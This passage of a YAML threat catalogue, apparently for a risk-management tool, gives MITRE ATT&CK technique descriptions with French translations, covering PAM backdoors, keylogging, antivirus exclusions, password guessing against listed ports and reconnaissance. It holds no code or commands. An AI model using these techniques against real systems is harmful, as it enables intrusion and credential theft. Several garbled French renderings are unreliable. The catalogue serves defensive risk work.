          \ pour transporter et obscurcir des charges utiles et du contenu malveillants.\
          \ Dans certains cas, les charges utiles int\xE9gr\xE9es peuvent \xE9galement\
          \ permettre aux adversaires de [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553)\
          \ sans affecter les contr\xF4les d\u2019ex\xE9cution tels que les signatures\
          \ num\xE9riques et les tickets de notarisation. (Citation : Laboratoires\
          \ Sentinelle) \n\nLes adversaires peuvent int\xE9grer des charges utiles\
          \ dans diff\xE9rents formats de fichier pour masquer les charges utiles.\
          \ (Citation : Microsoft Learn) Ceci est similaire \xE0 la [Steganographie](https://attack.mitre.org/techniques/T1027/003),\
          \ mais n\u2019implique pas de tisser du contenu malveillant en octets et\
          \ motifs sp\xE9cifiques li\xE9s \xE0 des formats de m\xE9dias num\xE9riques\
          \ l\xE9gitimes. (Citation : GitHub PSImage) \n\nPar exemple, des adversaires\
          \ ont \xE9t\xE9 observ\xE9s en train d\u2019int\xE9grer des charges utiles\
          \ dans un binaire autrement b\xE9nin ou en tant que superposition de celui-ci.\
          \ (Citation : securelist dtrack2) Des adversaires ont \xE9galement \xE9\
          t\xE9 observ\xE9s en train d\u2019imbriquer des charges utiles (telles que\
          \ des ex\xE9cutables et des scripts d\u2019ex\xE9cution seule) dans un fichier\
          \ du m\xEAme format. (Citation : SentinelLabs inversant les applescripts\
          \ en run-only 2021) \n\nLe contenu int\xE9gr\xE9 peut \xE9galement \xEA\
          tre utilis\xE9 comme charges utiles [Injection de processus](https://attack.mitre.org/techniques/T1055)\
          \ utilis\xE9es pour infecter des processus syst\xE8me inoffensifs. (Citation\
          \ : Trend Micro) Ces charges utiles int\xE9gr\xE9es puis inject\xE9es peuvent\
          \ \xEAtre utilis\xE9es dans le cadre de modules de logiciels malveillants\
          \ con\xE7us pour fournir des fonctionnalit\xE9s sp\xE9cifiques telles que\
          \ le chiffrement des communications C2 \xE0 l\u2019appui d\u2019un module\
          \ d\u2019orchestration. Par exemple, un module embarqu\xE9 peut \xEAtre\
          \ inject\xE9 dans les navigateurs par d\xE9faut, permettant aux adversaires\
          \ de communiquer ensuite via le r\xE9seau. (Citation : Rapport d\u2019analyse\
          \ des logiciels malveillants ComRAT)\nhttps://attack.mitre.org/techniques/T1027/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.003
    ref_id: T1556.003
    name: Pluggable Authentication Modules
    description: 'Adversaries may modify pluggable authentication modules (PAM) to
      access user credentials or enable otherwise unwarranted access to accounts.
      PAM is a modular system of configuration files, libraries, and executable files
      which guide authentication for many services. The most common authentication
      module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account
      authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation:
      Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)


      Adversaries may modify components of the PAM system to create backdoors. PAM
      components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary
      adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)


      Malicious modifications to the PAM system may also be abused to steal credentials.
      Adversaries may infect PAM resources with code to harvest user credentials,
      since the values exchanged with PAM components may be plain-text since PAM does
      not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

      https://attack.mitre.org/techniques/T1556/003'
    translations:
      fr:
        name: "Modules d\u2019authentification enfichables"
        description: "Les adversaires peuvent modifier les modules d\u2019authentification\
          \ enfichables (PAM) pour acc\xE9der aux informations d\u2019identification\
          \ de l\u2019utilisateur ou permettre un acc\xE8s injustifi\xE9 aux comptes.\
          \ PAM est un syst\xE8me modulaire de fichiers de configuration, de biblioth\xE8\
          ques et de fichiers ex\xE9cutables qui guident l\u2019authentification pour\
          \ de nombreux services. Le module d\u2019authentification le plus courant\
          \ est <code>pam_unix.so</code>, qui r\xE9cup\xE8re, d\xE9finit et v\xE9\
          rifie les informations d\u2019authentification de compte dans <code>/etc/passwd</code>\
          \ et <code>/etc/shadow</code>. (Citation : Apple PAM)(Citation : Man Pam_Unix)(Citation\
          \ : Red Hat PAM)\n\nLes adversaires peuvent modifier des composants du syst\xE8\
          me PAM pour cr\xE9er des portes d\xE9rob\xE9es. Les composants PAM, tels\
          \ que <code>pam_unix.so</code>, peuvent \xEAtre corrig\xE9s pour accepter\
          \ des valeurs arbitraires fournies par l\u2019adversaire comme informations\
          \ d\u2019identification l\xE9gitimes. (Citation : PAM Backdoor)\n\nLes modifications\
          \ malveillantes apport\xE9es au syst\xE8me PAM peuvent \xE9galement \xEA\
          tre utilis\xE9es de mani\xE8re abusive pour voler des informations d\u2019\
          identification. Les adversaires peuvent infecter les ressources PAM avec\
          \ du code pour collecter les informations d\u2019identification de l\u2019\
          utilisateur, car les valeurs \xE9chang\xE9es avec les composants PAM peuvent\
          \ \xEAtre en texte brut puisque PAM ne stocke pas les mots de passe. (Citation\
          \ : PAM Creds)(Citation : Apple PAM)\nhttps://attack.mitre.org/techniques/T1556/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.004
    ref_id: T1578.004
    name: Revert Cloud Instance
    description: 'An adversary may revert changes made to a cloud instance after they
      have performed malicious activities in attempt to evade detection and remove
      evidence of their presence. In highly virtualized environments, such as cloud-based
      infrastructure, this may be accomplished by restoring virtual machine (VM) or
      data storage snapshots through the cloud management dashboard or cloud APIs.


      Another variation of this technique is to utilize temporary storage attached
      to the compute instance. Most cloud providers provide various types of storage
      including persistent, local, and/or ephemeral, with the ephemeral types often
      reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation:
      Google - Restore Cloud Snapshot)

      https://attack.mitre.org/techniques/T1578/004'
    translations:
      fr:
        name: "R\xE9tablir l\u2019instance Cloud"
        description: "Un adversaire peut annuler les modifications apport\xE9es \xE0\
          \ une instance cloud apr\xE8s avoir effectu\xE9 des activit\xE9s malveillantes\
          \ dans le but d\u2019\xE9chapper \xE0 la d\xE9tection et de supprimer les\
          \ preuves de sa pr\xE9sence. Dans les environnements hautement virtualis\xE9\
          s, tels que les infrastructures bas\xE9es sur le cloud, cela peut \xEAtre\
          \ accompli en restaurant des instantan\xE9s de machine virtuelle (VM) ou\
          \ de stockage de donn\xE9es via le tableau de bord de gestion du cloud ou\
          \ des API cloud.\n\nUne autre variante de cette technique consiste \xE0\
          \ utiliser un stockage temporaire attach\xE9 \xE0 l\u2019instance de calcul.\
          \ La plupart des fournisseurs de cloud proposent diff\xE9rents types de\
          \ stockage, notamment persistant, local et/ou \xE9ph\xE9m\xE8re, les types\
          \ \xE9ph\xE9m\xE8res \xE9tant souvent r\xE9initialis\xE9s lors de l\u2019\
          arr\xEAt/red\xE9marrage de la machine virtuelle. (Citation : Tech Republic\
          \ - Restaurer les instantan\xE9s AWS)(Citation\_: Google - Restaurer l\u2019\
          instantan\xE9 du cloud)\nhttps://attack.mitre.org/techniques/T1578/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592
    ref_id: T1592
    name: Gather Victim Host Information
    description: "Adversaries may gather information about the victim's hosts that\
      \ can be used during targeting. Information about hosts may include a variety\
      \ of details, including administrative data (ex: name, assigned IP, functionality,\
      \ etc.) as well as specifics regarding its configuration (ex: operating system,\
      \ language, etc.).\n\nAdversaries may gather this information in various ways,\
      \ such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595)\
      \ or [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
      \ Adversaries may also compromise sites then include malicious content designed\
      \ to collect host information from visitors.(Citation: ATT ScanBox) Information\
      \ about hosts may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\
      \ Gathering this information may reveal opportunities for other forms of reconnaissance\
      \ (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)\
      \ or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),\
      \ establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)\
      \ or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ or [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also gather victim host information via User-Agent HTTP headers,\
      \ which are sent to a server to identify the application, operating system,\
      \ vendor, and/or version of the requesting user agent. This can be used to inform\
      \ the adversary\u2019s follow-on action. For example, adversaries may check\
      \ user agents for the requesting operating system, then only serve malware for\
      \ target operating systems while ignoring others.(Citation: TrellixQakbot)\n\
      https://attack.mitre.org/techniques/T1592"
    translations:
      fr:
        name: "Recueillir les informations sur l\u2019h\xF4te de la victime"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ h\xF4tes de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur les h\xF4tes peuvent inclure une vari\xE9t\xE9 de\
          \ d\xE9tails, y compris des donn\xE9es administratives (par exemple, nom,\
          \ adresse IP attribu\xE9e, fonctionnalit\xE9, etc.) ainsi que des d\xE9\
          tails concernant sa configuration (par exemple : syst\xE8me d\u2019exploitation,\
          \ langue, etc.).\n\nLes adversaires peuvent collecter ces informations de\
          \ diff\xE9rentes mani\xE8res, par exemple par le biais d\u2019une [analyse\
          \ active](https://attack.mitre.org/techniques/T1595) ou d\u2019un [hame\xE7\
          onnage pour obtenir des informations](https://attack.mitre.org/techniques/T1598).\
          \ Les adversaires peuvent \xE9galement compromettre les sites et inclure\
          \ du contenu malveillant con\xE7u pour collecter des informations sur l\u2019\
          h\xF4te aupr\xE8s des visiteurs. (Citation : ATT ScanBox) Les informations\
          \ sur les h\xF4tes peuvent \xE9galement \xEAtre expos\xE9es \xE0 des adversaires\
          \ via des ensembles de donn\xE9es en ligne ou d\u2019autres ensembles de\
          \ donn\xE9es accessibles (ex : [M\xE9dias sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Sites Web appartenant \xE0 des victimes de recherche](https://attack.mitre.org/techniques/T1594)).\
          \ La collecte de ces informations peut r\xE9v\xE9ler des possibilit\xE9\
          s pour d\u2019autres formes de reconnaissance (ex : [Recherche de sites\
          \ Web/domaines ouverts](https://attack.mitre.org/techniques/T1593) ou [Recherche\
          \ de bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ d\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [D\xE9\
          velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou\
          \ [Obtenir des capacit\xE9s](https://attack.mitre.org/techniques/T1588)),\
          \ et/ou d\u2019acc\xE8s initial (ex : [Cha\xEEne d\u2019approvisionnement\
          \ compromis](https://attack.mitre.org/techniques/T1195) ou [services \xE0\
          \ distance externes](https://attack.mitre.org/techniques/T1133)).\n\nLes\
          \ adversaires peuvent \xE9galement collecter des informations sur l\u2019\
          h\xF4te de la victime via des en-t\xEAtes HTTP User-Agent, qui sont envoy\xE9\
          s \xE0 un serveur pour identifier l\u2019application, le syst\xE8me d\u2019\
          exploitation, le fournisseur et/ou la version de l\u2019agent utilisateur\
          \ demandeur. Cela peut \xEAtre utilis\xE9 pour \xE9clairer l\u2019action\
          \ de suivi de l\u2019adversaire. Par exemple, les adversaires peuvent v\xE9\
          rifier les agents utilisateurs pour le syst\xE8me d\u2019exploitation demandeur,\
          \ puis ne diffuser des logiciels malveillants que pour les syst\xE8mes d\u2019\
          exploitation cibles tout en ignorant les autres. (Citation : TrellixQakbot)\n\
          https://attack.mitre.org/techniques/T1592"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.003
    ref_id: T1596.003
    name: Digital Certificates
    description: 'Adversaries may search public digital certificate data for information
      about victims that can be used during targeting. Digital certificates are issued
      by a certificate authority (CA) in order to cryptographically verify the origin
      of signed content. These certificates, such as those used for encrypted web
      traffic (HTTPS SSL/TLS communications), contain information about the registered
      organization such as name and location.


      Adversaries may search digital certificate data to gather actionable information.
      Threat actors can use online resources and lookup tools to harvest information
      about certificates.(Citation: SSLShopper Lookup) Digital certificate data may
      also be available from artifacts signed by the organization (ex: certificates
      used from encrypted web traffic are served with content).(Citation: Medium SSL
      Cert) Information from these sources may reveal opportunities for other forms
      of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1596/003'
    translations:
      fr:
        name: "Certificats num\xE9riques"
        description: "Les adversaires peuvent rechercher des donn\xE9es de certificat\
          \ num\xE9rique publiques pour obtenir des informations sur les victimes\
          \ qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les certificats num\xE9\
          riques sont \xE9mis par une autorit\xE9 de certification (CA) afin de v\xE9\
          rifier cryptographiquement l\u2019origine du contenu sign\xE9. Ces certificats,\
          \ tels que ceux utilis\xE9s pour le trafic Web chiffr\xE9 (communications\
          \ HTTPS SSL/TLS), contiennent des informations sur l\u2019organisation enregistr\xE9\
          e, telles que le nom et l\u2019emplacement.\n\nLes adversaires peuvent rechercher\
          \ des donn\xE9es de certificat num\xE9rique pour recueillir des informations\
          \ exploitables. Les auteurs de menace peuvent utiliser des ressources en\
          \ ligne et des outils de recherche pour recueillir des informations sur\
          \ les certificats. (Citation : SSLShopper Lookup) Les donn\xE9es de certificat\
          \ num\xE9rique peuvent \xE9galement \xEAtre disponibles \xE0 partir d\u2019\
          artefacts sign\xE9s par l\u2019organisation (par exemple, les certificats\
          \ utilis\xE9s \xE0 partir du trafic Web chiffr\xE9 sont servis avec du contenu).\
          \ (Citation : Certificat SSL moyen) Les informations provenant de ces sources\
          \ peuvent r\xE9v\xE9ler des possibilit\xE9s pour d\u2019autres formes de\
          \ reconnaissance (ex : [Analyse active](https://attack.mitre.org/techniques/T1595)\
          \ ou [Phishing pour obtenir de l\u2019information](https://attack.mitre.org/techniques/T1598)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [D\xE9\
          velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou\
          \ [Obtenir des capacit\xE9s](https://attack.mitre.org/techniques/T1588)),\
          \ et/ou un acc\xE8s initial (ex : [Externe distant Services](https://attack.mitre.org/techniques/T1133)\
          \ ou [Relation de confiance](https://attack.mitre.org/techniques/T1199)).\n\
          https://attack.mitre.org/techniques/T1596/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.001
    ref_id: T1056.001
    name: Keylogging
    description: 'Adversaries may log user keystrokes to intercept credentials as
      the user types them. Keylogging is likely to be used to acquire credentials
      for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      efforts are not effective, and may require an adversary to intercept keystrokes
      on a system for a substantial period of time before credentials can be successfully
      captured. In order to increase the likelihood of capturing credentials quickly,
      an adversary may also perform actions such as clearing browser cookies to force
      users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)


      Keylogging is the most prevalent type of input capture, with many different
      ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
      include:


      * Hooking API callbacks used for processing keystrokes. Unlike [Credential API
      Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
      on API functions intended for processing keystroke data.

      * Reading raw keystroke data from the hardware buffer.

      * Windows Registry modifications.

      * Custom drivers.

      * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
      adversaries with hooks into the operating system of network devices to read
      raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)

      https://attack.mitre.org/techniques/T1056/001'
    translations:
      fr:
        name: Enregistrement de frappe
        description: "Les adversaires peuvent enregistrer les frappes au clavier de\
          \ l\u2019utilisateur pour intercepter les informations d\u2019identification\
          \ au fur et \xE0 mesure que l\u2019utilisateur les saisit. L\u2019enregistrement\
          \ de frappe est susceptible d\u2019\xEAtre utilis\xE9 pour acqu\xE9rir des\
          \ informations d\u2019identification pour de nouvelles opportunit\xE9s d\u2019\
          acc\xE8s lorsque les efforts de [d\xE9chargement des informations d\u2019\
          identification du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003)\
          \ ne sont pas efficaces et peuvent n\xE9cessiter qu\u2019un adversaire intercepte\
          \ les frappes au clavier sur un syst\xE8me pendant une p\xE9riode de temps\
          \ importante avant que les informations d\u2019identification ne puissent\
          \ \xEAtre captur\xE9es avec succ\xE8s. Afin d\u2019augmenter la probabilit\xE9\
          \ de capturer rapidement les informations d\u2019identification, un adversaire\
          \ peut \xE9galement effectuer des actions telles que l\u2019effacement des\
          \ cookies du navigateur pour forcer les utilisateurs \xE0 se r\xE9authentifier\
          \ aupr\xE8s des syst\xE8mes. (R\xE9f\xE9rence : Talos Kimsuky, novembre\
          \ 2021)\n\nL\u2019enregistrement de frappe est le type de capture d\u2019\
          entr\xE9e le plus r\xE9pandu, avec de nombreuses fa\xE7ons diff\xE9rentes\
          \ d\u2019intercepter les frappes au clavier. (Citation : Aventures d\u2019\
          une frappe) Certaines m\xE9thodes incluent :\n\n* Callbacks de l\u2019API\
          \ de raccordement utilis\xE9s pour le traitement des frappes au clavier.\
          \ Contrairement \xE0 [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004),\
          \ il se concentre uniquement sur les fonctions API destin\xE9es au traitement\
          \ des donn\xE9es de frappe.\n* Lecture des donn\xE9es brutes de frappe \xE0\
          \ partir de la m\xE9moire tampon mat\xE9rielle.\n* Modifications du registre\
          \ Windows.\n* Pilotes personnalis\xE9s.\n* [Modifier l\u2019image syst\xE8\
          me](https://attack.mitre.org/techniques/T1601) peut fournir aux adversaires\
          \ des crochets dans le syst\xE8me d\u2019exploitation des p\xE9riph\xE9\
          riques r\xE9seau pour lire les frappes brutes des sessions de connexion.\
          \ (Citation : Blog Cisco Legacy Device Attacks)\nhttps://attack.mitre.org/techniques/T1056/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.012
    ref_id: T1564.012
    name: File/Path Exclusions
    description: 'Adversaries may attempt to hide their file-based artifacts by writing
      them to specific folders or file names excluded from antivirus (AV) scanning
      and other defensive capabilities. AV and other file-based scanners often include
      exclusions to optimize performance as well as ease installation and legitimate
      use of applications. These exclusions may be contextual (e.g., scans are only
      initiated in response to specific triggering events/alerts), but are also often
      hardcoded strings referencing specific folders and/or files assumed to be trusted
      and legitimate.(Citation: Microsoft File Folder Exclusions)


      Adversaries may abuse these exclusions to hide their file-based artifacts. For
      example, rather than  tampering with tool settings to add a new exclusion (i.e.,
      [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries
      may drop their file-based payloads in default or otherwise well-known exclusions.
      Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)
      and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043)
      activities to both discover and verify existing exclusions in a victim environment.

      https://attack.mitre.org/techniques/T1564/012'
    translations:
      fr:
        name: "Exclusions de fichiers/chemins d\u2019acc\xE8s"
        description: "Les adversaires peuvent tenter de masquer leurs artefacts bas\xE9\
          s sur des fichiers en les \xE9crivant dans des dossiers sp\xE9cifiques ou\
          \ des noms de fichiers exclus de l\u2019analyse antivirus (AV) et d\u2019\
          autres fonctionnalit\xE9s d\xE9fensives. Les scanners antivirus et autres\
          \ analyseurs bas\xE9s sur des fichiers incluent souvent des exclusions pour\
          \ optimiser les performances et faciliter l\u2019installation et l\u2019\
          utilisation l\xE9gitime des applications. Ces exclusions peuvent \xEAtre\
          \ contextuelles (par exemple, les analyses ne sont lanc\xE9es qu\u2019en\
          \ r\xE9ponse \xE0 des \xE9v\xE9nements/alertes d\xE9clencheurs sp\xE9cifiques),\
          \ mais sont aussi souvent des cha\xEEnes cod\xE9es en dur faisant r\xE9\
          f\xE9rence \xE0 des dossiers et/ou des fichiers sp\xE9cifiques suppos\xE9\
          s fiables et l\xE9gitimes. (Citation : Exclusions de dossiers de fichiers\
          \ Microsoft)\n\nLes adversaires peuvent abuser de ces exclusions pour masquer\
          \ leurs artefacts bas\xE9s sur des fichiers. Par exemple, plut\xF4t que\
          \ de modifier les param\xE8tres de l\u2019outil pour ajouter une nouvelle\
          \ exclusion (par exemple, [D\xE9sactiver ou modifier les outils](https://attack.mitre.org/techniques/T1562/001)),\
          \ les adversaires peuvent supprimer leurs charges utiles bas\xE9es sur des\
          \ fichiers dans des exclusions par d\xE9faut ou autrement bien connues.\
          \ Les adversaires peuvent \xE9galement utiliser [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)\
          \ et d\u2019autres activit\xE9s [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043)\
          \ pour d\xE9couvrir et v\xE9rifier les exclusions existantes dans un environnement\
          \ victime.\nhttps://attack.mitre.org/techniques/T1564/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1222.002
    ref_id: T1222.002
    name: Linux and Mac File and Directory Permissions Modification
    description: "Adversaries may modify file or directory permissions/attributes\
      \ to evade access control lists (ACLs) and access protected files.(Citation:\
      \ Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018)\
      \ File and directory permissions are commonly managed by ACLs configured by\
      \ the file or directory owner, or users with the appropriate permissions. File\
      \ and directory ACL implementations vary by platform, but generally explicitly\
      \ designate which users or groups can perform which actions (read, write, execute,\
      \ etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission\
      \ groups (user, group, and other) and a standard set of permissions (read, write,\
      \ and execute) that are applied to each group. While nuances of each platform\u2019\
      s permissions implementation may vary, most of the platforms provide two primary\
      \ commands used to manipulate file and directory ACLs: <code>chown</code> (short\
      \ for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial\
      \ may use these commands to make themselves the owner of files and directories\
      \ or change the mode if current permissions allow it. They could subsequently\
      \ lock others out of the file. Specific file and directory modifications may\
      \ be a required step for many techniques, such as establishing Persistence via\
      \ [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004)\
      \ or tainting/hijacking other instrumental binary/configuration files via [Hijack\
      \ Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS\
      \ Common Tools and Techniques)\nhttps://attack.mitre.org/techniques/T1222/002"
    translations:
      fr:
        name: "Modification des autorisations de fichiers et de r\xE9pertoires Linux\
          \ et Mac"
        description: "Les adversaires peuvent modifier les autorisations/attributs\
          \ de fichiers ou de r\xE9pertoires pour contourner les listes de contr\xF4\
          le d\u2019acc\xE8s (ACL) et acc\xE9der aux fichiers prot\xE9g\xE9s. (Citation\
          \ : Hybrid Analysis Icacls1 juin 2018)(Citation : Analyse hybride Icacls2\
          \ mai 2018) Les autorisations de fichiers et de r\xE9pertoires sont g\xE9\
          n\xE9ralement g\xE9r\xE9es par des listes de contr\xF4le d\u2019acc\xE8\
          s configur\xE9es par le propri\xE9taire du fichier ou du r\xE9pertoire,\
          \ ou par les utilisateurs disposant des autorisations appropri\xE9es. Les\
          \ impl\xE9mentations de listes de contr\xF4le d\u2019acc\xE8s de fichiers\
          \ et de r\xE9pertoires varient selon la plate-forme, mais d\xE9signent g\xE9\
          n\xE9ralement explicitement quels utilisateurs ou groupes peuvent effectuer\
          \ quelles actions (lecture, \xE9criture, ex\xE9cution, etc.).\n\nLa plupart\
          \ des plates-formes Linux et bas\xE9es sur Linux fournissent un ensemble\
          \ standard de groupes d\u2019autorisations (utilisateur, groupe et autres)\
          \ et un ensemble standard d\u2019autorisations (lecture, \xE9criture et\
          \ ex\xE9cution) qui sont appliqu\xE9s \xE0 chaque groupe. Bien que les nuances\
          \ de l\u2019impl\xE9mentation des autorisations de chaque plate-forme puissent\
          \ varier, la plupart des plates-formes fournissent deux commandes principales\
          \ utilis\xE9es pour manipuler les ACL de fichiers et de r\xE9pertoires :\
          \ <code>chown</code> (abr\xE9viation de change owner) et <code>chmod</code>\
          \ (abr\xE9viation de change mode).\n\nAdversarial peut utiliser ces commandes\
          \ pour se faire propri\xE9taire de fichiers et de r\xE9pertoires ou changer\
          \ de mode si les autorisations actuelles le permettent. Ils pourraient par\
          \ la suite emp\xEAcher d\u2019autres personnes d\u2019acc\xE9der au fichier.\
          \ Des modifications sp\xE9cifiques de fichiers et de r\xE9pertoires peuvent\
          \ \xEAtre une \xE9tape n\xE9cessaire pour de nombreuses techniques, telles\
          \ que l\u2019\xE9tablissement de la persistance via [Unix Shell Configuration\
          \ Modification](https://attack.mitre.org/techniques/T1546/004) ou l\u2019\
          alt\xE9ration/d\xE9tournement d\u2019autres fichiers binaires/de configuration\
          \ instrumentaux via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\
          \ (Citation : 20 outils et techniques courants macOS)\nhttps://attack.mitre.org/techniques/T1222/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.001
    ref_id: T1110.001
    name: Password Guessing
    description: 'Adversaries with no prior knowledge of legitimate credentials within
      the system or environment may guess passwords to attempt access to accounts.
      Without knowledge of the password for an account, an adversary may opt to systematically
      guess the password using a repetitive or iterative mechanism. An adversary may
      guess login credentials without prior knowledge of system or environment passwords
      during an operation by using a list of common passwords. Password guessing may
      or may not take into account the target''s policies on password complexity or
      use policies that may lock accounts out after a number of failed attempts.


      Guessing passwords can be a risky option because it could cause numerous authentication
      failures and account lockouts, depending on the organization''s login failure
      policies. (Citation: Cylance Cleaver)


      Typically, management services over commonly used ports are used when guessing
      passwords. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)

      * SNMP (161/UDP and 162/TCP/UDP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces
      (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication
      protocols.(Citation: Trend Micro Emotet 2020)


      In default environments, LDAP and Kerberos connection attempts are less likely
      to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      https://attack.mitre.org/techniques/T1110/001'
    translations:
      fr:
        name: Devinage du mot de passe
        description: "Les adversaires qui n\u2019ont aucune connaissance pr\xE9alable\
          \ des informations d\u2019identification l\xE9gitimes au sein du syst\xE8\
          me ou de l\u2019environnement peuvent deviner des mots de passe pour tenter\
          \ d\u2019acc\xE9der aux comptes. Sans conna\xEEtre le mot de passe d\u2019\
          un compte, un adversaire peut choisir de deviner syst\xE9matiquement le\
          \ mot de passe \xE0 l\u2019aide d\u2019un m\xE9canisme r\xE9p\xE9titif ou\
          \ it\xE9ratif. Un adversaire peut deviner les identifiants de connexion\
          \ sans conna\xEEtre au pr\xE9alable les mots de passe du syst\xE8me ou de\
          \ l\u2019environnement au cours d\u2019une op\xE9ration \xE0 l\u2019aide\
          \ d\u2019une liste de mots de passe courants. La supposition de mot de passe\
          \ peut ou non prendre en compte les politiques de la cible en mati\xE8re\
          \ de complexit\xE9 des mots de passe ou utiliser des strat\xE9gies qui peuvent\
          \ verrouiller les comptes apr\xE8s un certain nombre de tentatives infructueuses.\n\
          \nDeviner les mots de passe peut \xEAtre une option risqu\xE9e, car elle\
          \ peut entra\xEEner de nombreux \xE9checs d\u2019authentification et de\
          \ verrouillage de compte, en fonction des politiques d\u2019\xE9chec de\
          \ connexion de l\u2019organisation. (R\xE9f\xE9rence : Cylance Cleaver)\n\
          \nEn r\xE8gle g\xE9n\xE9rale, les services de gestion sur les ports couramment\
          \ utilis\xE9s sont utilis\xE9s pour deviner les mots de passe. Les services\
          \ les plus souvent cibl\xE9s sont les suivants :\n\n* SSH (22/TCP)\n* Telnet\
          \ (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP et 445/TCP)\n\
          * LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n\
          * Services de gestion HTTP/HTTP (80/TCP et 443/TCP)\n* MSSQL (1433/TCP)\n\
          * Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP\
          \ et 162/TCP/UDP)\n\nOutre les services de gestion, les adversaires peuvent\
          \ \xAB cibler l\u2019authentification unique (SSO) et les applications bas\xE9\
          es sur le cloud \xE0 l\u2019aide de protocoles d\u2019authentification f\xE9\
          d\xE9r\xE9s \xBB, ainsi que les applications de messagerie externes, telles\
          \ qu\u2019Office 365. (R\xE9f\xE9rence : US-CERT TA18-068A 2018). De plus,\
          \ les adversaires peuvent abuser des interfaces de p\xE9riph\xE9riques r\xE9\
          seau (telles que \xAB wlanAPI \xBB) pour forcer par force brute le(s) routeur(s)\
          \ wifi(s) accessible(s) via des protocoles d\u2019authentification sans\
          \ fil. (Citation : Trend Micro Emotet 2020)\n\nDans les environnements par\
          \ d\xE9faut, les tentatives de connexion LDAP et Kerberos sont moins susceptibles\
          \ de d\xE9clencher des \xE9v\xE9nements via SMB, ce qui cr\xE9e l\u2019\xE9\
          v\xE9nement d'\xAB \xE9chec de connexion \xBB Windows ID 4625.\nhttps://attack.mitre.org/techniques/T1110/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1216.001
    ref_id: T1216.001
    name: PubPrn
